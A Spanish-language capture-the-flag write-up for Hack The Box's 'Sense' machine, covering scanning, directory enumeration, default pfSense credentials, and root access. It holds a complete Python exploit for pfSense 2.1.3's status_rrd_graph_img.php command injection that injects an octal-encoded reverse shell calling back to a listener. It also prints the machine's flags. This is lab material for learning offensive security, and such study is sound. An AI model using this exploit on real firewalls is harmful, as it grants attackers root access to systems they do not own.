---
tags:
permalink: /Sense-HTB-Writeup
title: Sense - Easy (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p80,443 10.129.234.152                                          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-07 16:15 -0300
Nmap scan report for 10.129.234.152
Host is up (0.56s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.129.234.152/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-server-header: lighttpd/1.4.35
|_http-title: Login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.51 seconds
```

## Website SSL

Un panel de login para el servicio de `pfSense`, donde credenciales comunes, no son validas.

![image-center](/assets/images/Pasted image 20260107161715.png)
### Gobuster enumeration

Luego de prueba y falla enumerando directorios, y esperar horas, descubrí un archivo `txt`.

```bash
gobuster dir -u https://sense.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt  -t 150 -k -x php,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://sense.htb
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5793]
/help.php             (Status: 200) [Size: 5793]
/themes               (Status: 301) [Size: 0] [--> https://sense.htb/themes/]
/stats.php            (Status: 200) [Size: 5793]
/css                  (Status: 301) [Size: 0] [--> https://sense.htb/css/]
/includes             (Status: 301) [Size: 0] [--> https://sense.htb/includes/]
/edit.php             (Status: 200) [Size: 5793]
/system.php           (Status: 200) [Size: 5793]
/license.php          (Status: 200) [Size: 5793]
/status.php           (Status: 200) [Size: 5793]
/javascript           (Status: 301) [Size: 0] [--> https://sense.htb/javascript/]
/changelog.txt        (Status: 200) [Size: 271]
/classes              (Status: 301) [Size: 0] [--> https://sense.htb/classes/]
/exec.php             (Status: 200) [Size: 5793]
/widgets              (Status: 301) [Size: 0] [--> https://sense.htb/widgets/]
/graph.php            (Status: 200) [Size: 5793]
/tree                 (Status: 301) [Size: 0] [--> https://sense.htb/tree/]
/wizard.php           (Status: 200) [Size: 5793]
/shortcuts            (Status: 301) [Size: 0] [--> https://sense.htb/shortcuts/]
/pkg.php              (Status: 200) [Size: 5793]
/installer            (Status: 301) [Size: 0] [--> https://sense.htb/installer/]
/wizards              (Status: 301) [Size: 0] [--> https://sense.htb/wizards/]
/xmlrpc.php           (Status: 200) [Size: 384]
/reboot.php           (Status: 200) [Size: 384]  
/system-users.txt     (Status: 200) [Size: 384]
```
## Shell as root

Viendo el contenido del mismo veo un usuario con unas credenciales.

![image-center](/assets/images/Pasted image 20260107163239.png)
### Admin Dashboard

Usándola, me da error.

![image-center](/assets/images/Pasted image 20260107163254.png)

Así que luego de una búsqueda en internet, vi que la password por defecto de este servicio es `pfsense`, dándome acceso al panel de administración.

Dentro del mismo vi la versión `2.1.3`.

![image-center](/assets/images/Pasted image 20260107163704.png)
### Exploit

Esta versión cuenta con una vulnerabilidad de tipo `Command Injection`, donde a continuación deje un script, algo modificado al original, ya que por alguna razón los demás no funcionaron.

```python
#!/usr/bin/env python3
import argparse
import requests
import urllib
import urllib3
import collections

'''
pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
This script will return a reverse shell on specified listener address and port.
Ensure you have started a listener to catch the shell before running!
'''

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help = "Remote Host")
parser.add_argument('--lhost', help = 'Local Host listener')
parser.add_argument('--lport', help = 'Local Port listener')
parser.add_argument("--username", help = "pfsense Username")
parser.add_argument("--password", help = "pfsense Password")
args = parser.parse_args()

rhost = args.rhost
lhost = args.lhost
lport = args.lport
username = args.username
password = args.password


# command to be converted into octal
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)


payload = ""

# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"

headers = [
	('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'),
	('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
	('Accept-Language', 'en-US,en;q=0.5'),
	('Referer',login_url),
	('Connection', 'close'),
	('Upgrade-Insecure-Requests', '1'),
	('Content-Type', 'application/x-www-form-urlencoded')
]

# probably not necessary but did it anyways
headers = collections.OrderedDict(headers)

# Disable insecure https connection warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

client = requests.session()

# try to get the login page and grab the csrf token
try:
	login_page = client.get(login_url, verify=False)

	index = login_page.text.find("csrfMagicToken")
	csrf_token = login_page.text[index:index+128].split('"')[-1]

except:
	print("Could not connect to host!")
	exit()

# format login variables and data
if csrf_token:
	print("CSRF token obtained")
	login_data = [('__csrf_magic',csrf_token), ('usernamefld',username), ('passwordfld',password), ('login','Login') ]
	login_data = collections.OrderedDict(login_data)
	encoded_data = urllib.parse.urlencode(login_data)

# POST login request with data, cookies and header
	login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers, verify=False)
else:
	print("No CSRF token!")
	exit()

if login_request.status_code == 200:
		print("Running exploit...")
# make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell
		try:
			exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5, verify=False)
			if exploit_request.status_code:
				print("Error running exploit")
		except:
			print("Exploit completed")
```
### Shell

Ejecutándolo obtengo acceso como `root`, lo que me permite ver ambas flags.

```bash
root@zsln:/home/zsln/Desktop/zsln/htb/sense# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.152] 22753
sh: can't access tty; job control turned off
# whoami
root
```

```bash
# cat user.txt
8721327cc232073b40d27d9c17e7348b
```

```bash
cat root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86
```

`~Happy Hacking.`